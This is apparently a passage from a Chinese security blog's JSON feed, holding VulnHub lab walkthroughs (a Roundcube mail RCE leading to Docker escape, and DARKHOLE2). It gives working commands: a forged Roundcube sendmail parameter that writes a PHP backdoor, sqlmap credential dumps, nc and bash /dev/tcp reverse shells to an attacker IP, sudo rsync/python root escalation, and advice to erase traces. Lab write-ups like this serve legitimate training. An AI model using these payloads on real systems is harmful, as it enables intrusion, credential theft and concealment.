alt=\"Image\">\n<h3 id=\"roundcube-邮件系统\"><a class=\"markdownIt-Anchor\" href=\"#roundcube-邮件系统\">#</a> roundcube 邮件系统</h3>\n<p>有一封邮件，看起来比较重要，看一下什么意思</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1567.png\" width=\"660\" alt=\"Image\">\n<p>就是有一个 gpg 加密后的 ssh 私钥文件，解开此私钥文件即可登陆 p 48</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1568.png\" width=\"660\" alt=\"Image\">\n<p>找了一圈没有找到 roundcude 的版本，直接用 searchsploit 搜索一波</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1569.png\" width=\"660\" alt=\"Image\">\n<p>将此 RCE 漏洞说明文件复制到本地，开始阅读，尝试测试能否突破</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1570.png\" width=\"470\" alt=\"Image\">\n<blockquote>\n<p>阅读后发现需要将 from 改为 example@example.com -OQueueDirectory=/tmp -X/var/www/html/rce.php，从_subject 参数中获取到 rce.php 脚本的内容</p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1571.png\" width=\"520\" alt=\"Image\">\n<p>在后台中开是发送邮件，并且把数据拦截到 burp, 利用 burp 抓包，可以看到原始数据包有很多参数</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1572.png\" width=\"520\" alt=\"Image\">\n<blockquote>\n<p>伪造参数内容如下，其中 token 需要和自己抓到的数据的 token 一致<br>\n<span class=\"exturl\" data-url=\"bWFpbHRvOl90b2tlbj1rcnBKOWhMSGFic1lFQUdzUzk4aXBJVkxSQmZ3SFh3VSZhbXA7X3Rhc2s9bWFpbCZhbXA7X2FjdGlvbj1zZW5kJmFtcDtfaWQ9MTEzMTU0ODgwMDYyZjcwYzVhOTBlMTYmYW1wO19hdHRhY2htZW50cz0mYW1wO19mcm9tPWV4YW1wbGVAZXhhbXBsZS5jb20=\">_token=krpJ9hLHabsYEAGsS98ipIVLRBfwHXwU&amp;_task=mail&amp;_action=send&amp;_id=113154880062f70c5a90e16&amp;_attachments=&amp;_from=example@example.com</span> -OQueueDirectory=/tmp -X/var/www/html/rce.php&amp;_to=sssssss%<span class=\"exturl\" data-url=\"aHR0cDovLzQwcXEuY29t\">40qq.com</span>&amp;_cc=&amp;_bcc=&amp;_replyto=&amp;_followupto=&amp;_subject=<?php phpinfo();?>&amp;editorSelector=plain&amp;_priority=0&amp;_store_target=Sent&amp;_draft_saveid=&amp;_draft=&amp;_is_html=0&amp;_framed=1&amp;_message=aaa</p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1573.png\" width=\"520\" alt=\"Image\">\n<p>页面访问发现没有看到 rce.php 的代码，但是不是 not found 的提示，说明我们已经成功的上传上去了一个后门</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1574.png\" width=\"420\" alt=\"Image\">\n<h3 id=\"shell转移到antsword\"><a class=\"markdownIt-Anchor\" href=\"#shell转移到antsword\">#</a> shell 转移到 antsword</h3>\n<p>其他没有任何信息的页面应该是如下内容</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1575.png\" width=\"380\" alt=\"Image\">\n<p>这次直接写一个 post 的一句话后门，可用 antsword 连接</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1576.png\" width=\"580\" alt=\"Image\">\n<p>连接成功后门，可以继续往此后门中写入反弹 shell 的代码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1577.png\" width=\"620\" alt=\"Image\">\n<p>写入 mkfifo 构造好的反弹 shell 的代码并保存</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1578.png\" width=\"660\" alt=\"Image\">\n<p>用 curl 执行的同时，用来监听这个端口等到接收反弹 shell</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1579.png\" width=\"440\" alt=\"Image\">\n<h3 id=\"gpg文件解密\"><a class=\"markdownIt-Anchor\" href=\"#gpg文件解密\">#</a> gpg 文件解密</h3>\n<p>发现有 p48 这个用户，切换后输入 electrico 即可切换成功</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1580.png\" width=\"440\" alt=\"Image\">\n<p>发现了一个 gpg 的私钥文件，看来就是邮件系统中提醒我们用来解开 gpg 加密后的 ssh 密钥的一个密匙</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1581.png\" width=\"440\" alt=\"Image\">\n<p>有一个非常好的解密 gpg 的工具 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZ3B0b29sLmdpdGh1Yi5pby8=\">https://pgptool.github.io/</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1582.png\" width=\"620\" alt=\"Image\">\n<p>下载好一个 jar 包，选取解密模块，将邮件系统中的 gpg 导入</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1583.png\" width=\"620\" alt=\"Image\">\n<p>提示需要一个密码，输入 p48 的密码 electrico</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1584.png\" width=\"520\" alt=\"Image\">\n<p>输入解密成功之后导出的文件的位置</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1585.png\" width=\"620\" alt=\"Image\">\n<p>解密成功得到了一个 ssh 的私钥文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1586.png\" width=\"460\" alt=\"Image\">\n<h3 id=\"docker容器提权\"><a class=\"markdownIt-Anchor\" href=\"#docker容器提权\">#</a> docker 容器提权</h3>\n<p>没有用到在用户目录下得到的密匙文件，但是照样把这个 key 得到了，这个 key 理论上是可以登陆到 p48 用户的，但是需要注意的是，靶机上没有开放 ssh 端口，那我们应该怎么连呢</p>\n<p>先把这个文件给 echo 到靶机上，并且改变私钥文件的权限</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1587.png\" width=\"460\" alt=\"Image\">\n<blockquote>\n<p>注意到当前靶机的 ip 地址中有 dokcer 网卡，既然靶机上没有开放 ssh 端口无法通过 p48 的密钥接入到 p48 用户上，那么是不是可以先用私钥文件进到一台开通了 ssh 协议的 docker 容器中呢，就试试看</p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1588.png\" width=\"660\" alt=\"Image\">\n<p>测试一下出了 172.17.0.1 的网关地址之外，存活的 docker 主机，找到一台 172.17.0.2 是存活主机</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1589.png\" width=\"660\" alt=\"Image\">\n<p><code>ssh p48@172.17.0.2 -i id_rsa</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1590.png\" width=\"470\" alt=\"Image\">\n<p>成功进入到了 docker 容器内部，用的 p 48 这个用户进去的，看 hostname 像是在 docker 容器内部，而且有 sudo 权限设置错误，可以直接调用 root 的 rsync<br>\n <code>sudo rsync -e 'sh -c &quot;sh 0&lt;&amp;2 1&gt;&amp;2&quot;' 127.0.0.1:/dev/null</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1591.png\" width=\"660\" alt=\"Image\">\n<blockquote>\n<p>提权到了 root 之后，由于我们还在 docker 内部，ip 也只有一个本地回环地址和一个 docker 虚拟出来的 ip，但是我们可以与 docker 的网关地址，即宿主机直接通信，连接到 172.17.0.1 就相当于连接到了宿主机，而我们在 docker 内部连的时候是不需要外部开通 22 端口的  <code>ssh root@172.17.0.1</code></p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1592.png\" width=\"580\" alt=\"Image\">\n<p>查看 ip 地址</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1593.png\" width=\"660\" alt=\"Image\">\n<p>-&gt; 成功拿到了 root 权限，并且查看到 ip 是宿主机的 ip</p>\n",
            "tags": [
                "VULNHUB 41-50"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/142%20DARKHOLE2/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/142%20DARKHOLE2/",
            "title": "VULNHUB 42 DARKHOLE2",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZGFya2hvbGUtMiw3NDAv\">https://www.vulnhub.com/entry/darkhole-2,740/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vd2RkLWJsb2cvcC8xNTIzMDgyNi5odG1s\">https://www.cnblogs.com/wdd-blog/p/15230826.html</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135 (由于设置成了 DHCP、可能多变)<br>\n 靶机 DARKHOLE2：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1) 确定靶机 ip 地址和开放的端口</p>\n<p>由已至内网靶机所在主机 MAC 地址自动扫描靶机服务<br>\n <code>sudo arp-scan -l | grep 'a0' | awk '&#123;print $1,$2&#125;' | cut -d ' ' -f 1 | xargs sudo nmap -PA</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1192.png\" width=\"700\" alt=\"Image\">\n<p>2) 再次对其开放的端口进行详细的扫描</p>\n<p><code>sudo nmap -A -p- 192.168.31.12 --min-rate=5000</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1193.png\" width=\"560\" alt=\"Image\">\n<p>-&gt; 靶机 ip：192.168.31. 12 、靶机开放端口 22,80</p>\n<p>-&gt; 并且扫描到了再 80 端口上是存在 git 源码泄漏的</p>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTI=\">http://192.168.31.12</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1194.png\" width=\"520\" alt=\"Image\">\n<p>扫描目录  <code>gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.12</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1195.png\" width=\"520\" alt=\"Image\">\n<p>依次对得到的目录信息进行访问搜索有价值的信息</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTIvbG9naW4ucGhw\">http://192.168.31.12/login.php</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1196.png\" width=\"520\" alt=\"Image\">\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTIvZGFzaGJvYXJkLnBocA==\">http://192.168.31.12/dashboard.php</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1197.png\" width=\"420\" alt=\"Image\">\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTIvY29uZmlnLw==\">http://192.168.31.12/config/</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1198.png\" width=\"400\" alt=\"Image\">\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTIvY29uZmlnL2NvbmZpZy5waHA=\">http://192.168.31.12/config/config.php</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1199.png\" width=\"510\" alt=\"Image\">\n<p>通过对上述几个目录的信息收集，只能确定一个后台的登陆地址 login.php，和一个不被允许进入的 dashboard.php 两个信息</p>\n<h3 id=\"git源码泄漏利用\"><a class=\"markdownIt-Anchor\" href=\"#git源码泄漏利用\">#</a> .git 源码泄漏利用</h3>\n<p>在端口扫描阶段因为有.git 的信息，对.git 进行访问<br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTIvLmdpdC8=\"> http://192.168.31.12/.git/</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1200.png\" width=\"320\" alt=\"Image\">\n<p>利用 githack 对源码泄漏进行利用</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1201.png\" width=\"520\" alt=\"Image\">\n<p><code>wget https://github.com/lijiejie/GitHack/archive/refs/heads/master.zip -O Githack.zip -q;unzip -q Githack.zip;cd GitHack-master;</code> <br>\n <code>python3 GitHack.py http://192.168.31.12/.git</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1202.png\" width=\"660\" alt=\"Image\">\n<p>通过.git 文件可以得到此项目的源码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1203.png\" width=\"460\" alt=\"Image\">\n<p>源码中有 config 是敏感文件，进行读取</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1204.png\" width=\"480\" alt=\"Image\">\n<p>得到了数据的账户密码  <code>root:darkhole_2</code></p>\n<p>但是通过 githack 的方式读取到的源码没有记录之前的 git 版本，没法使用 git 命令去获取到之前提交的版本</p>\n<h3 id=\"git-log切换git分支\"><a class=\"markdownIt-Anchor\" href=\"#git-log切换git分支\">#</a> git log 切换 git 分支</h3>\n<p>除了 githack 的利用方式之外还可以用如下方式</p>\n<p><code>TF=$(mktemp -d); cd $TF;wget -r http://192.168.31.12/.git/ -q; cd $TF/192.168.31.12 &amp;&amp; git clone. webapp &amp;&amp; cd webapp</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1205.png\" width=\"660\" alt=\"Image\">\n<p>通过这种方式可以得到.git 文件，执行 git 的相关命令</p>\n<p><code>git log</code>  查看之前提交的版本，看到有一次提交信息是涉及到 login.php 的，切换到该分支查看<br>\n <code>git reset --hard a4d900a8d85e8938d3601f3cef113ee293028e10</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1206.png\" width=\"580\" alt=\"Image\">\n<p>在 login.php 内容中看到了用户名和密码 <code>lush@admin.com:321</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1207.png\" width=\"500\" alt=\"Image\">\n<h3 id=\"sqlmap一把梭\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap一把梭\">#</a> sqlmap 一把梭</h3>\n<p>通过得到的用户名和密码进入到了对方后台管理中心</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1208.png\" width=\"620\" alt=\"Image\">\n<p>观察 url 地址 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuOTQvZGFzaGJvYXJkLnBocD9pZD0x\">http://192.168.31.94/dashboard.php?id=1</span></p>\n<p>似乎是存在 sql 注入的，通过 burp 截取数据包</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1209.png\" width=\"620\" alt=\"Image\">\n<p><code>sqlmap -r 1.txt --dbs --batch</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1210.png\" width=\"520\" alt=\"Image\">\n<p>跑出来了数据库的名字 darkhole_2，继续测试数据库中有哪些表<br>\n <code>sqlmap -r 1.txt --dbs --batch - D darkhole_2 --tables</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1211.png\" width=\"480\" alt=\"Image\">\n<p>得到两张表，选取 ssh 表去查看有哪些列<br>\n <code>sqlmap -r 1.txt --dbs --batch - D darkhole_2 -T ssh --columns</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1212.png\" width=\"480\" alt=\"Image\">\n<p>得到此表下的三个字段 user、id、pass<br>\n <code>sqlmap -r 1.txt --batch -D darkhole_2 -T ssh -C user,id,pass --dump</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1213.png\" width=\"480\" alt=\"Image\">\n<p>最终得到了数据库的用户名和密码 <code>jehad:fool</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1214.png\" width=\"700\" alt=\"Image\">\n<p>凭借凭据 jehad 拿到了靶机上一个普通用户的权限</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1215.png\" width=\"520\" alt=\"Image\">\n<p>查看靶机上有没有开放特殊的端口</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1216.png\" width=\"480\" alt=\"Image\">\n<h3 id=\"curl-测试网站\"><a class=\"markdownIt-Anchor\" href=\"#curl-测试网站\">#</a> curl 测试网站</h3>\n<blockquote>\n<p>发现在这台服务器上有 9999 端口正在运行，但是此端口被防火墙关掉了，我们在 kali 机器上无法访问此端口，可以做 ssh 端口转发将此端口映射到外面，当然也可以通过 curl 命令在这台 linux 机器上直接访问此网站</p>\n</blockquote>\n<p><code>curl -vv 127.0.0.1:9999</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1217.png\" width=\"350\" alt=\"Image\">\n<p>可以看到所提交的数据包以及返回的数据包，并且可以看到页面是采用的 php 写的，返回了一个 cmd 的参数，很有可能是命令执行漏洞；执行系统命令，看当前这个网站是属于哪个用户下的</p>\n<blockquote>\n<p><code>curl 127.0.0.1:9999?cmd=id;echo ''</code> <br>\n <code>echo ''</code>  的作用使回显比较美观一些，没有实际的作用<br>\n得到了此网站是由用户 losy 的权限搞的，现在需要把 losy 用户的 shell 反弹<br>\n判断 losy 是否可以使用 nc 命令反弹 shell<br>\n <code>curl 127.0.0.1:9999?cmd=which%20nc;echo ''</code></p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1218.png\" width=\"460\" alt=\"Image\">\n<p>使用 nc 反弹 shell，并在 kali 上进行监听<br>\n <code>curl 127.0.0.1:9999?cmd=nc%20192.168.31.99%204444%20-e%20/bin/bash;echo ''</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1219.png\" width=\"590\" alt=\"Image\">\n<p>反弹失败了，有可能是因为被禁用了 nc、也有可能是未采用 base 64 编码，需要都进行尝试一番，使用 bash 反弹 shell 时的命令执行成功了</p>\n<p><code>curl 127.0.0.1:9999/?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.31.99%2F4444%200%3E%261%27</code> <br>\n 采用的命令即是： <code>bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.31. 99 /4444 0&gt;&amp;1'</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1220.png\" width=\"700\" alt=\"Image\">\n<h3 id=\"调整为标准终端\"><a class=\"markdownIt-Anchor\" href=\"#调整为标准终端\">#</a> 调整为标准终端</h3>\n<p>调整为一个标准的 tty 终端</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class=\"line\">python3 -c &quot;__import__(&#x27;pty&#x27;).spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class=\"line\">stty -a</span><br><span class=\"line\">stty raw -echo;fg</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-1221.png\" width=\"540\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">调整TERM、<span class=\"built_in\">stty</span>的窗口大小</span></span><br><span class=\"line\">export TERM=xterm</span><br><span class=\"line\">stty rows 31 columns 118</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-1222.png\" width=\"320\" alt=\"Image\">\n<p>此刻的我们已经拿到了 losy 用户的 shell</p>\n<h3 id=\"历史遗留信息\"><a class=\"markdownIt-Anchor\" href=\"#历史遗留信息\">#</a> 历史遗留信息</h3>\n<p>在 kali 上给靶机传输一个 pspy 看看有没有敏感任务被执行</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1223.png\" width=\"700\" alt=\"Image\">\n<p>看到在 /opt/web 下有一个 php 启动本地 9999 端口的命令</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1224.png\" width=\"660\" alt=\"Image\">\n<p>由此造成了 9999 端口处的命令执行漏洞</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1225.png\" width=\"290\" alt=\"Image\">\n<p>到处查看文件，找到了在 bash_history 里边的敏感记录，当中有一个密码，发现这个密码不是 root 用户的，只是 losy 用户的，这个密码也可以爆破得到</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1226.png\" width=\"340\" alt=\"Image\">\n<p>通过 <code>sudo -l</code>  查到了一条隐私设置错误的记录<br>\n `sudo -u root python3 -c “<strong>import</strong>(‘os’).system(’/bin/bash’)”``</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1227.png\" width=\"620\" alt=\"Image\">\n<p>-&gt; 提权成功拿到了 root 权限</p>\n<h3 id=\"ssh-显示系统信息\"><a class=\"markdownIt-Anchor\" href=\"#ssh-显示系统信息\">#</a> ssh 显示系统信息</h3>\n<p>对于 ssh 登陆之后有大量的系统信息展示出来，这在我们看来是完全没有必要的，而且占用了大量的屏幕不太友好，接下来就自定义 ssh 登陆后的信息</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1228.png\" width=\"480\" alt=\"Image\">\n<p>这是默认显示的信息，分了两部分，上面的是打印的系统信息，下面的是最后登陆到此服务器的时间和 ip</p>\n<p>上边的信息来自来自 /run/motd.dynamic 文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1229.png\" width=\"480\" alt=\"Image\">\n<p>这个文件的信息无法修改，哪怕被清空了也会复原。</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1230.png\" width=\"480\" alt=\"Image\">\n<blockquote>\n<p>它是由 /etc/update-motd.d/ 下的几个脚本文件来动态生成的。将 /etc/update-motd.d/ 下的脚本移除或者去掉可执行权限可将此动态生成的系统信息去掉。<br>\n <code>chmod -x /etc/update-motd.d/*;echo &gt; /run/motd.dynamic;</code></p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1231.png\" width=\"600\" alt=\"Image\">\n<blockquote>\n<p>反之，赋予这个文件夹所有文件可执行权限之后，可以显示出系统信息开启 linux 系统信息展示： <code>chmod +x /etc/update-motd.d/*</code></p>\n</blockquote>\n<h3 id=\"ssh-最后登录ip\"><a class=\"markdownIt-Anchor\" href=\"#ssh-最后登录ip\">#</a> ssh 最后登录 ip</h3>\n<blockquote>\n<p>下面的这条显示最后登陆信息是由 ssh 控制，ssh 默认是开启此记录的，可修改 ssh 的配置文件，令其消失不见，关闭最后登陆的日志命令如下：<br>\n <code>sed -i 's/#PrintLastLog yes/PrintLastLog no/g' /etc/ssh/sshd_config;systemctl restart sshd</code></p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1232.png\" width=\"560\" alt=\"Image\">\n<p>最后登陆的消息一般来说比较重要，可以方便的看到自己的机器是否有异地登陆的情况出现，开启最后登陆的日志命令如下：</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1233.png\" width=\"560\" alt=\"Image\">\n<h3 id=\"ssh-登录时logo\"><a class=\"markdownIt-Anchor\" href=\"#ssh-登录时logo\">#</a> ssh 登录时 logo</h3>\n<blockquote>\n<p>很多时候我们需要自定义一些登陆后的 logo 展示，可以选在登陆前或者登陆后显示一些 logo，而 /etc/motd 的作用就是用来登陆之后会显示的内容，可在 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYm9vdHNjaG9vbC5uZXQvYXNjaWklRTQlQjglOEElRTglQkYlOUIlRTglQTElOEMlRTUlQUQlOTclRTYlQUYlOEQlRTclOUElODQlRTUlOUIlQkUlRTUlQkQlQTIlRTclQkMlOTYlRTclQTAlODE=\">https://www.bootschool.net/ascii 上进行字母的图形编码</span><br>\n开启 linux 登陆 logo 提示：<br>\n <code>echo -e '\\n\\n\\t\\t██╗ ██╗ ████████╗\\n\\t\\t╚██╗██╔╝ ╚══██╔══╝\\n\\t\\t ╚███╔╝ ██║ \\n\\t\\t ██╔██ ╗ ██║ \\n\\t\\t██╔╝ ██╗███████╗██║ \\n\\t\\t ╚═╝ ╚═╝╚══════╝╚═╝\\n' &gt; /etc/motd</code> <br>\n-e 表示开启转义 \\n 表示换行 \\t 表示 tab 按键</p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1234.png\" width=\"520\" alt=\"Image\">\n<blockquote>\n<p>关闭这个 logo 提示，只需要将 /etc/motd 清空就可以<br>\n <code>echo &gt; /etc/motd;vim /etc/motd +&quot;d 1 &quot; +wq</code>  会有一个空格<br>\n <code>cat /dev/null &gt; /etc/motd</code>  没有任何东西，直接清空文件</p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1235.png\" width=\"380\" alt=\"Image\">\n<blockquote>\n<p>上述命令是用来展示或者不展示在 linux 登陆之后的 logo，还有一种方式是用来添加在 linux 登陆之前就来展示的 logo，使用 /etc/issue.net 来控制<br>\n <code>sed -i 's/#Banner none/Banner \\/etc\\/issue.net/g' /etc/ssh/sshd_config;systemctl restart sshd; echo -e '\\n\\t\\t███████╗██╗ ██╗██╗ ██╗\\n\\t\\t╚══███╔╝╚██╗ ██╔╝██║ ██║\\n\\t\\t ███╔╝ ╚████╔╝ ███████║\\n\\t\\t ███╔╝ ╚██╔╝ ██╔══██║\\n\\t\\t███████╗ ██║ ██║ ██║\\n\\t\\t╚══════╝ ╚═╝ ╚═╝ ╚═╝' &gt; /etc/issue.net</code></p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1236.png\" width=\"560\" alt=\"Image\">\n<blockquote>\n<p>可以看到这条 logo 信息是在我们输入 root 密码之前就显示出来的，是在登陆前显示的，/etc/issue.net 的作用就是登陆前显示信息<br>\n将登陆后的信息也显示一下进行对比就更容易理解执行前面的命令，给 /etc/motd 重新打印出来了 X_T 的样式</p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1237.png\" width=\"550\" alt=\"Image\">\n<blockquote>\n<p>/etc/issue.net 显示在登陆前，/etc/motd 显示在登陆后<br>\n一键关闭登陆前的信息展示<br>\n <code>sed -i 's/Banner \\/etc\\/issue.net/#Banner none/g' /etc/ssh/sshd_config;systemctl restart sshd;echo &gt; /etc/issue.net</code></p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1238.png\" width=\"580\" alt=\"Image\">\n<h3 id=\"ssh-自定义登录文字\"><a class=\"markdownIt-Anchor\" href=\"#ssh-自定义登录文字\">#</a> ssh 自定义登录文字</h3>\n<blockquote>\n<p>除了上述几种方式外，我们还可以添加自定义的语句到环境变量中，登陆到 shell 后就会执行</p>\n</blockquote>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在环境变量里边添加figlet表示以一种方式去打印后面跟的字母或者数字</span></span><br><span class=\"line\">cat &gt;&gt; ~/.bashrc &lt;&lt; EOF</span><br><span class=\"line\">figlet I\\&#x27;m X_T</span><br><span class=\"line\">EOF</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">检查这个文件是否完整的写入到了环境变量里边</span></span><br><span class=\"line\">cat ~/.bashrc | tail -n1</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-1239.png\" width=\"380\" alt=\"Image\">\n<p>vim ~/.bashrcs 删除此条信息则不会在显示这条</p>\n<h3 id=\"一键删除登录信息\"><a class=\"markdownIt-Anchor\" href=\"#一键删除登录信息\">#</a> 一键删除登录信息</h3>\n<blockquote>\n<p>如果显示的信息太多了，影响视觉，有没有办法一键全部删除掉，答案是肯定的，在每个用户下执行创建.hushlogin 文件，则所有非环境变量里边的信息都再不会被显示出来<br>\n for USER in `cat /etc/passwd | grep /bin/bash |grep -v root | cut -d “:” -f 1` ;do touch /home/$USER/.hushlogin;done;touch /root/.hushlogin</p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1240.png\" width=\"520\" alt=\"Image\">\n<blockquote>\n<p>一键删除阻碍登陆日志信息输出的文件：<br>\nfor USER in `cat /etc/passwd | grep /bin/bash |grep -v root | cut -d “:” -f 1` ;do rm -f /home/$USER/.hushlogin;done;rm -f /root/.hushlogin</p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1241.png\" width=\"520\" alt=\"Image\">\n<p>根据以上的信息就可以自定义 ssh 登陆的信息自定义的设置，当然最后记得复原，并且删除自己操作过的痕迹，防止被知道自己操作过什么。</p>\n",
            "tags": [
                "VULNHUB 41-50"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2020/04/01/MBTI/ENFP%E8%A7%A3%E8%AF%BB/",
            "url": "http://www.n1h1l157.live/2020/04/01/MBTI/ENFP%E8%A7%A3%E8%AF%BB/",
            "title": "ENFP解读",
            "date_published": "2020-03-31T16:00:00.000Z",
